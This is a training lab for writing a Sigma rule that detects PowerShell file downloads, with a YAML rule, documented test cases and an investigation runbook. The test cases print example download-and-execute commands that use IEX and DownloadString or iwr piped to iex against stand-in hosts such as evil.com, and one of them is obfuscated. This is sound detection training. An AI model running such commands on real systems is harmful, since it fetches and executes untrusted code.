# Lab 2: Create Your First Sigma Rule

## Objective
Write a Sigma detection rule from scratch.

## Scenario
You need to detect when attackers use PowerShell to download files from the internet, a common technique used in initial compromise.

## Prerequisites
- Text editor
- Basic understanding of Windows Event Logs
- Sigma documentation

## Tasks

### Part 1: Research (10 min)

1. Research the technique:
   - MITRE ATT&CK: T1059.001 (PowerShell)
   - Windows Event ID: 4104 (ScriptBlock logging)

2. Identify detection logic:
   - Look for `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `wget`, `curl`

### Part 2: Write the Rule (20 min)

Create `powershell_download.yml`:

```yaml
title: Suspicious PowerShell Download Activity
id: [Generate a UUID - use uuidgen or online tool]
status: experimental
description: |
    Detects PowerShell commands that download files from remote URLs.
    This is a common technique used by attackers for initial access
    and malware delivery.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://docs.microsoft.com/powershell/module/microsoft.powershell.utility/invoke-webrequest
author: [Your Name]
date: 2024/01/01
modified: 2024/01/01
tags:
    - attack.execution
    - attack.t1059.001
    - attack.command_and_control
logsource:
    product: windows
    service: powershell
    definition: 'Requirements: Script Block Logging must be enabled'
detection:
    selection_cmdlet:
        EventID: 4104
        ScriptBlockText|contains:
            - 'DownloadString('
            - 'DownloadFile('
            - 'Invoke-WebRequest'
            - 'iwr '
            - 'wget '
            - 'curl '
    filter_legitimate:
        ScriptBlockText|contains:
            - 'microsoft.com'
            - 'windowsupdate.com'
    condition: selection_cmdlet and not filter_legitimate
falsepositives:
    - Legitimate software updates
    - IT administration scripts
    - Package managers (Chocolatey, etc.)
level: high
```

### Part 3: Create Test Cases (15 min)

Document test scenarios in `test_cases.md`:

```markdown
# Test Cases for PowerShell Download Detection

## Positive Cases (Should Alert)

1. **Malicious Download**
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
   ```

2. **Alternative Syntax**
   ```powershell
   Invoke-WebRequest -Uri http://attacker.com/tool.exe -OutFile C:\temp\tool.exe
   ```

3. **Shortened Command**
   ```powershell
   iwr http://malicious.com/script.ps1 | iex
   ```

## Negative Cases (Should NOT Alert)

1. **Windows Update**
   ```powershell
   Invoke-WebRequest -Uri https://update.microsoft.com/patch.msu
   ```

2. **Legitimate Admin Script**
   ```powershell
   # Filtered by whitelist
   DownloadString('https://microsoft.com/script.ps1')
   ```

## Edge Cases

1. **Obfuscation**
   ```powershell
   $wc = New-Object Net.WebClient; $wc.('Down'+'loadString')('http://evil.com')
   ```
   Status: May not detect (limitation documented)
```

### Part 4: Documentation (15 min)

Create `RUNBOOK.md`:

```markdown
# PowerShell Download Detection - Investigation Runbook

## Alert Details
**Severity:** High  
**MITRE ATT&CK:** T1059.001

## Initial Triage (5 minutes)

1. **Identify the user:**
   - Is this a privileged account?
   - Does the user typically run PowerShell?

2. **Check the URL:**
   - Is the domain known/trusted?
   - Check threat intelligence feeds
   - Is it a recently registered domain?

3. **Inspect the command:**
   - What was being downloaded?
   - Were there follow-up commands?

## Investigation Steps

1. **Check process tree:**
   ```
   Get parent process of PowerShell
   Was it launched by explorer, cmd, or another suspicious process?
   ```

2. **Look for artifacts:**
   - Downloaded files in temp directories
   - Execution of downloaded files
   - Network connections to the URL

3. **Correlate events:**
   - Other alerts from same user/host?
   - Successful/failed login attempts?
   - Other PowerShell activity?

## Response Actions

### If confirmed malicious:
1. Isolate the host
2. Collect forensic artifacts
3. Hunt for similar activity
4. Update indicators

### If false positive:
1. Document the reason
2. Consider tuning the rule
3. Add to whitelist if appropriate

## Tuning Guidance

- Add legitimate domains to filter
- Adjust for environment-specific tools
- Consider adding parent process filters
```

## Deliverables

- [ ] Complete Sigma YAML rule
- [ ] Test cases documented
- [ ] Investigation runbook
- [ ] Rule validated with sigma CLI (optional)

## Validation

If you have `sigma-cli` installed:
```bash
sigma check powershell_download.yml
```

## Bonus Challenges

1. Add field mappings for Splunk and Elastic
2. Create variations for Linux/macOS
3. Add correlation with network events
4. Write unit tests in Python

## Resources

- [Sigma Specification](https://github.com/SigmaHQ/sigma-specification)
- [Windows PowerShell Logging](https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging_windows)
